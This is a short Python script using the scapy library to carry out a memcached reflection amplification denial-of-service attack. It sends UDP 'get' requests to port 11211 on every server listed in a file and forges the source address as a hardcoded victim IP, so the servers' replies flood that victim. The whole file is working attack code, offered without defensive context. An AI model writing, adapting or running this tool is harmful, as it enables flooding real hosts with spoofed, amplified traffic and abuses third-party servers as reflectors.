from scapy.all import *

def attack(sip,dip,dport,power=10):
	return send(IP(src=dip,dst=sip)/UDP(sport=dport,dport=11211)/Raw(load="\x00\x00\x00\x00x\x00\x01\x00\x00get abc\r\n"),count=power)
if __name__ == "__main__":
	a=open("ok.txt").readlines()[:]
	
	for i in a:
		print(i[:-1])
		attack(i[:-1],"121.36.157.201",2333)
	print(len(a))
